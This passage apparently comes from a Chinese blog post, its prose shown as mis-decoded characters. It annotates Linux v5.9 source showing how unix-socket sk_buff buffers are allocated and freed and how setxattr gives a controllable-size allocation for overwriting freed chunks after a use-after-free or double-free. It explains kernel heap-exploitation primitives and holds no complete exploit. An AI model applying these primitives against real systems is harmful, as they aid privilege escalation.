<li>æ¯è°ƒç”¨<code>wirte</code>å‡½æ•°å†™å…¥ä¸€æ¬¡æ•°æ®ï¼Œéƒ½ä¼šèµ°ä¸€éæµç¨‹ï¼Œç”³è¯·æ–°çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>ï¼Œä¸åŒæ¶ˆæ¯ä¹‹é—´ç›¸äº’ç‹¬ç«‹ã€‚</li>
</ul>

        <h5 id="B-æ•°æ®å¤åˆ¶"   >
          <a href="#B-æ•°æ®å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-æ•°æ®å¤åˆ¶" class="headerlink" title="B.æ•°æ®å¤åˆ¶"></a>B.æ•°æ®å¤åˆ¶</h5>
      <p>ç›¸å…³å†…å­˜ç”³è¯·å®Œæˆä¹‹åï¼Œå›åˆ°<code>unix_stream_sendmsg</code>å‡½æ•°ï¼Œå¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶<code>skb_copy_datagram_from_iter</code>ï¼Œå³ä¸Šè¿°æåˆ°çš„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">skb_copy_datagram_from_iter</span><span class="params">(struct sk_buff *skb, <span class="keyword">int</span> offset,</span></span></span><br><span class="line"><span class="params"><span class="function">                                struct iov_iter *from,</span></span></span><br><span class="line"><span class="params"><span class="function">                                <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = skb_headlen(skb);			<span class="comment">// skb-&gt;len - skb-&gt;data_len;</span></span><br><span class="line">    <span class="keyword">int</span> i, copy = start - offset;			<span class="comment">// copy æ˜¯çº¿æ€§æ•°æ®åŒºçš„å‰©ä½™ç©ºé—´å¤§å°</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line">    <span class="comment">//æ‹·è´åˆ°ç”³è¯·çš„ä¿å­˜æ•°æ®çš„å †å—skb-&gt;data</span></span><br><span class="line">    <span class="keyword">if</span> (copy &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">            copy = len;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_iter(skb-&gt;data + offset, copy, from) != copy)</span><br><span class="line">            <span class="keyword">goto</span> fault;</span><br><span class="line">        <span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        offset += copy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾-3"   >
          <a href="#â‘¡é‡Šæ”¾-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-3" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>å½“ä»<code>socker</code>å¥—æ¥å­—ä¸­è¯»å–å‡ºæŸæ¡ä¿¡æ¯çš„æ‰€æœ‰æ•°æ®æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¯¥æ¡ä¿¡æ¯çš„ç›¸å…³å†…å­˜çš„é‡Šæ”¾ï¼Œå³è¯¥æ¡ä¿¡æ¯å¯¹åº”<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>çš„é‡Šæ”¾ã€‚åŒæ ·çš„ï¼Œå¦‚æœè¯¥æ¡ä¿¡æ¯æ²¡æœ‰è¢«è¯»å–å®Œæ¯•ï¼Œåˆ™ä¸ä¼šå‘ç”Ÿè¯¥ä¿¡æ¯ç›¸å…³å†…å­˜çš„é‡Šæ”¾ã€‚</p>
<p>åœ¨<code>read</code>æ—¶è¿›è¡Œçš„å‡½æ•°è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read -&gt; ksys_read() -&gt; vfs_read() -&gt; new_sync_read() -&gt; call_read_iter() -&gt; sock_read_iter() -&gt; sock_recvmsg() -&gt; sock_recvmsg_nosec() -&gt; unix_stream_recvmsg() -&gt; unix_stream_read_generic()</span><br></pre></td></tr></table></div></figure>

<p>åŒæ ·çš„åœ¨<code>unix_stream_read_generic</code>å¤„å¼€å§‹åˆ†å‰ï¼Œä¹Ÿæ˜¯åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸‹é¢æˆªå–é‡è¦éƒ¨åˆ†</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_read_generic</span><span class="params">(struct unix_stream_read_state *state,</span></span></span><br><span class="line"><span class="params"><span class="function">				    <span class="keyword">bool</span> freezable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">		chunk = <span class="keyword">min_t</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>, unix_skb_len(skb) - skip, size);</span><br><span class="line">		skb_get(skb);</span><br><span class="line">        <span class="comment">//------------------åˆ†å‰ä¸€:æ•°æ®å¤åˆ¶</span></span><br><span class="line">        <span class="comment">//recv_actorå‡½æ•°æŒ‡é’ˆæ˜¯åœ¨unix_stream_recvmsgå‡½æ•°ä¸­å®šä¹‰çš„stateå‡½æ•°è¡¨</span></span><br><span class="line">        <span class="comment">//è¯¥å‡½æ•°æŒ‡é’ˆå¯¹åº”unix_stream_read_actorå‡½æ•°,å³ä»è¿™å¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶</span></span><br><span class="line">		chunk = state-&gt;recv_actor(skb, skip, chunk, state);</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="comment">//ä¼ è¾“æ•°æ®å®Œæˆä¹‹å,skb-&gt;usersä»2æ”¹ä¸º1,è¡¨ç¤ºå·²ç»å¤åˆ¶å®Œæ•°æ®äº†,æ–¹ä¾¿åç»­åˆ¤æ–­</span></span><br><span class="line">        <span class="comment">//æ¶ˆæ¯ä¸­æ˜¯å¦è¿˜æœ‰æ•°æ®</span></span><br><span class="line">		consume_skb(skb);</span><br><span class="line">		<span class="keyword">if</span> (chunk &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (copied == <span class="number">0</span>)</span><br><span class="line">				copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		copied += chunk;</span><br><span class="line">		size -= chunk;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Mark read part of skb as used */</span></span><br><span class="line">		<span class="keyword">if</span> (!(flags &amp; MSG_PEEK)) &#123;</span><br><span class="line">            <span class="comment">//ä¿®æ”¹skbç±»å‹è½¬æ¢ä¹‹åå¯¹åº”çš„consumedå­—æ®µ,å…¶å®å°±æ˜¯skb-&gt;cbæŸä¸ªä½ç½®å¤„çš„æ•°æ®</span></span><br><span class="line">            <span class="comment">//#define UNIXCB(skb)	(*(struct unix_skb_parms *)&amp;((skb)-&gt;cb))</span></span><br><span class="line">			UNIXCB(skb).consumed += chunk;</span><br><span class="line">			<span class="comment">//ä¾æ®ä¸Šé¢çš„consumedå’Œlenæ¥åˆ¤æ–­æ¶ˆæ¯ä¸­æ˜¯å¦è¿˜å‰©ä¸‹æ²¡æœ‰ä¼ è¾“çš„æ•°æ®</span></span><br><span class="line">            <span class="comment">//æœ‰(1)åˆ™break,æ— (0)åˆ™è¿›å…¥åç»­çš„å†…å­˜é‡Šæ”¾é˜¶æ®µ</span></span><br><span class="line">			<span class="keyword">if</span> (unix_skb_len(skb))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//------------------------åˆ†å‰äºŒ:å†…å­˜é‡Šæ”¾</span></span><br><span class="line">            <span class="comment">//å†…å­˜é‡Šæ”¾å‰ç½®å·¥ä½œ</span></span><br><span class="line">			skb_unlink(skb, &amp;sk-&gt;sk_receive_queue);</span><br><span class="line">            <span class="comment">//è¿›å…¥è¯¥å‡½æ•°,é€šè¿‡å¯¹äºskb-&gt;usersçš„åˆ¤æ–­ä¹‹å,è¿›å…¥å†…å­˜é‡Šæ”¾é˜¶æ®µ</span></span><br><span class="line">			consume_skb(skb);</span><br><span class="line">            <span class="comment">//....................</span></span><br><span class="line">	&#125; <span class="keyword">while</span> (size);</span><br><span class="line">        <span class="comment">//......................</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> copied ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-æ•°æ®å¤åˆ¶"   >
          <a href="#A-æ•°æ®å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-æ•°æ®å¤åˆ¶" class="headerlink" title="A.æ•°æ®å¤åˆ¶"></a>A.æ•°æ®å¤åˆ¶</h5>
      <p>ä¹‹åçš„å‡½æ•°è°ƒç”¨é“¾ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix_stream_read_actor() -&gt; skb_copy_datagram_msg() -&gt; skb_copy_datagram_iter() -&gt; __skb_datagram_iter()</span><br></pre></td></tr></table></div></figure>

<p>æœ€ç»ˆè¿›å…¥<code>__skb_datagram_iter</code>ï¼Œ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __skb_datagram_iter(<span class="keyword">const</span> struct sk_buff *skb, <span class="keyword">int</span> offset,</span><br><span class="line">			       struct iov_iter *to, <span class="keyword">int</span> len, <span class="keyword">bool</span> fault_short,</span><br><span class="line">			       <span class="keyword">size_t</span> (*cb)(<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">size_t</span>, <span class="keyword">void</span> *,</span><br><span class="line">					    struct iov_iter *), <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> start = skb_headlen(skb);</span><br><span class="line">	<span class="keyword">int</span> i, copy = start - offset, start_off = offset, n;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy header. */</span></span><br><span class="line">    <span class="comment">//è¿™ä¸ªheaderæŒ‡çš„å°±æ˜¯æ•°æ®data,å¤§æ¦‚å°±æ˜¯ä»è¿™é‡Œå¼€å§‹å®é™…çš„æ•°æ®</span></span><br><span class="line">	<span class="keyword">if</span> (copy &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">			copy = len;</span><br><span class="line">		n = INDIRECT_CALL_1(cb, simple_copy_to_iter,</span><br><span class="line">				    skb-&gt;data + offset, copy, data, to);</span><br><span class="line">		offset += n;</span><br><span class="line">		<span class="keyword">if</span> (n != copy)</span><br><span class="line">			<span class="keyword">goto</span> short_copy;</span><br><span class="line">		<span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">/* Copy paged appendix. Hmm... why does this look so complicated? */</span></span><br><span class="line">    <span class="comment">//linuxå†…æ ¸ç»´æŠ¤äººå‘˜éƒ½çœ‹ä¸ä¸‹å»äº†,xs</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œä½¿ç”¨äº†æ„Ÿè§‰å¾ˆå¤æ‚çš„æœºåˆ¶ï¼Œä¸æ˜¯å¾ˆæ‡‚ã€‚</p>

        <h5 id="B-å†…å­˜é‡Šæ”¾"   >
          <a href="#B-å†…å­˜é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-å†…å­˜é‡Šæ”¾" class="headerlink" title="B.å†…å­˜é‡Šæ”¾"></a>B.å†…å­˜é‡Šæ”¾</h5>
      <p>è¿›å…¥å†…å­˜é‡Šæ”¾çš„å‡½æ•°è°ƒç”¨é“¾ä¸º</p>
<ul>
<li><p>é‡Šæ”¾<code>skb-&gt;data</code>éƒ¨åˆ†ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;skb_release_all()-&gt;skb_release_all()-&gt;skb_release_data()-&gt;skb_free_head()</span><br></pre></td></tr></table></div></figure>

<p>å¯¹åº”å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">skb_free_head</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//å…¶å®headå’Œdataæ˜¯ä¸€æ ·çš„</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *head = skb-&gt;head;</span><br><span class="line">	<span class="keyword">if</span> (skb-&gt;head_frag) &#123;</span><br><span class="line">		<span class="keyword">if</span> (skb_pp_recycle(skb, head))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		skb_free_frag(head);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		kfree(head);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„æ­£å¸¸çš„<code>kfree</code>å‡½æ•°</p>
</li>
<li><p>é‡Šæ”¾<code>skb</code>éƒ¨åˆ†ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;kfree_skbmem()</span><br></pre></td></tr></table></div></figure>

<p>ç›¸å…³å‡½æ•°å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">kfree_skbmem</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_fclones</span> *<span class="title">fclones</span>;</span></span><br><span class="line">    <span class="comment">//å…‹éš†ä½“ç›¸å…³çš„,æ²¡æœ‰forkä¹‹ç±»çš„è¯ä¸€èˆ¬ä¸ç”¨å¤ªç®¡çš„</span></span><br><span class="line">    <span class="keyword">switch</span> (skb-&gt;fclone) &#123;</span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_UNAVAILABLE:</span><br><span class="line">            <span class="comment">//ç”¨ä¸“é—¨çš„cache(skbuff_head_cache)è¿›è¡Œå›æ”¶</span></span><br><span class="line">            kmem_cache_free(skbuff_head_cache, skb);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_ORIG:</span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* We usually free the clone (TX completion) before original skb</span></span><br><span class="line"><span class="comment">		 * This test would have no chance to be true for the clone,</span></span><br><span class="line"><span class="comment">		 * while here, branch prediction will be good.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">            <span class="keyword">if</span> (refcount_read(&amp;fclones-&gt;fclone_ref) == <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">goto</span> fastpath;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">/* SKB_FCLONE_CLONE */</span></span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!refcount_dec_and_test(&amp;fclones-&gt;fclone_ref))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">fastpath:</span><br><span class="line">    <span class="comment">//ç”¨ä¸“é—¨çš„cache(skbuff_fclone_cache)è¿›è¡Œå›æ”¶å…‹éš†çš„skb</span></span><br><span class="line">    kmem_cache_free(skbuff_fclone_cache, fclones);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªå°±ä¸å¤ªå¥½åˆ©ç”¨äº†ã€‚</p>
<p>åŒæ ·çš„ï¼Œå½“å…³é—­çš„ä¿¡é“çš„ä¸¤ç«¯ï¼Œè¯¥ä¿¡é“å†…äº§ç”Ÿçš„æ‰€æœ‰çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>éƒ½ä¼šå¾—åˆ°é‡Šæ”¾</p>
</li>
</ul>

        <h5 id="å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š"   >
          <a href="#å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š" class="headerlink" title="å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š"></a>å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š</h5>
      <ul>
<li><p>å½“ä»ä¿¡é“ä¸­å°†æŸæ¡æ¶ˆæ¯å…¨éƒ¨è¯»å–å®Œä¹‹åï¼Œä¼šå‘ç”Ÿè¯¥æ¡æ¶ˆæ¯å¯¹åº”çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>çš„å†…å­˜é‡Šæ”¾ï¼Œä¸”<code>sk_buff</code>é‡Šæ”¾åˆ°ä¸“é—¨çš„ç¼“å­˜æ± ä¸­ï¼Œ<code>skb-&gt;data</code>ä½¿ç”¨æ­£å¸¸çš„<code>kfree</code>é‡Šæ”¾</p>
</li>
<li><p>å½“å…³é—­ä¿¡é“ä¸¤ç«¯ï¼Œè¯¥ä¿¡é“å†…äº§ç”Ÿçš„æ‰€æœ‰çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>éƒ½ä¼šå¾—åˆ°é‡Šæ”¾ï¼Œå…·ä½“çš„è°ƒç”¨é“¾ä¸ºï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock_close()-&gt;__sock_release()-&gt;unix_release()-&gt;__kfree_skb()</span><br></pre></td></tr></table></div></figure>

<p>åé¢å°±ç±»ä¼¼äº†ã€‚</p>
</li>
</ul>

        <h2 id="9-setxattrâ€”è¿‘ä¹ä»»æ„å¤§å°"   >
          <a href="#9-setxattrâ€”è¿‘ä¹ä»»æ„å¤§å°" class="heading-link"><i class="fas fa-link"></i></a><a href="#9-setxattrâ€”è¿‘ä¹ä»»æ„å¤§å°" class="headerlink" title="9.setxattrâ€”è¿‘ä¹ä»»æ„å¤§å°"></a>9.setxattrâ€”è¿‘ä¹ä»»æ„å¤§å°</h2>
      <p>è¿™ä¸ªæ€»ç»“è¿‡ï¼Œç›´æ¥æ‰’è¿‡æ¥</p>
<p>è°ƒç”¨é“¾ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()-&gt;path_setxattr()-&gt;setxattr()</span><br></pre></td></tr></table></div></figure>

<p>ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fs/xattr.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">setxattr</span><span class="params">(struct user_namespace *mnt_userns, struct dentry *d,</span></span></span><br><span class="line"><span class="params"><span class="function">	 <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value, <span class="keyword">size_t</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function">	 <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">void</span> *kvalue = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">char</span> kname[XATTR_NAME_MAX + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~(XATTR_CREATE|XATTR_REPLACE))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	error = strncpy_from_user(kname, name, <span class="keyword">sizeof</span>(kname));</span><br><span class="line">	<span class="keyword">if</span> (error == <span class="number">0</span> || error == <span class="keyword">sizeof</span>(kname))</span><br><span class="line">		error = -ERANGE;</span><br><span class="line">	<span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size) &#123;</span><br><span class="line">		<span class="keyword">if</span> (size &gt; XATTR_SIZE_MAX)</span><br><span class="line">			<span class="keyword">return</span> -E2BIG;</span><br><span class="line">        <span class="comment">//ç”³è¯·chunkï¼ŒåŸºæœ¬ç›¸å½“äºkmallocå‡½æ•°ï¼Œsizeå¯æ§</span></span><br><span class="line">		kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!kvalue)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="comment">//ä»valueæ‹·è´å†…å®¹åˆ°kvalueï¼Œvalueå¯æ§</span></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line">			error = -EFAULT;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ((<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_ACCESS) == <span class="number">0</span>) ||</span><br><span class="line">		    (<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == <span class="number">0</span>))</span><br><span class="line">			posix_acl_fix_xattr_from_user(mnt_userns, kvalue, size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	error = vfs_setxattr(mnt_userns, d, kname, kvalue, size, flags);</span><br><span class="line">out:</span><br><span class="line">    <span class="comment">//é‡Šæ”¾chunkï¼ŒåŸºæœ¬ç­‰äºkfreeå‡½æ•°</span></span><br><span class="line">	kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å…³æ³¨ç‚¹åœ¨<code>kvmalloc</code>ã€<code>copy_from_user</code>ã€<code>kvfree</code>ã€‚</p>
<p><code>kvmalloc</code>ä¸­çš„sizeå¯æ§ï¼Œ<code>copy_from_user</code>ä¸­çš„<code>value</code>å¯æ§</p>
<p>ä¹Ÿå°±æ˜¯è¯´å½“<code>freelist</code>ä¸­å­˜åœ¨æˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„chunkï¼Œè€Œè¯¥chunkåˆæ˜¯æˆ‘ä»¬æ§åˆ¶çš„æŸä¸ªè®¾å¤‡å†…å­˜å—æ—¶ï¼Œ(é€šè¿‡double-freeæˆ–è€…UAFå®ç°)é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>setxattr</code>æ¥å¯¹è¯¥è®¾å¤‡å†…å­˜è¿›è¡Œä»»æ„å†™ã€‚è™½ç„¶æœ€åä¼šé‡Šæ”¾ï¼Œä½†æ˜¯ä¹Ÿåªä¼šå½±å“å†…å­˜å—ä¸­å­˜æ”¾ä¸‹ä¸€ä¸ªchunkåœ°å€å¤„çš„å†…å®¹0x8ä¸ªå­—èŠ‚ï¼Œè€Œå½“æˆ‘ä»¬ç”¨ä¸ç€è¿™ä¸ªåœ°æ–¹çš„å†…å®¹æ—¶ï¼Œå°±ä¸ç”¨å¤ªå…³æ³¨äº†ã€‚</p>

        <h3 id="ğŸ”ºæ³¨ï¼š-2"   >
          <a href="#ğŸ”ºæ³¨ï¼š-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š-2" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h3>
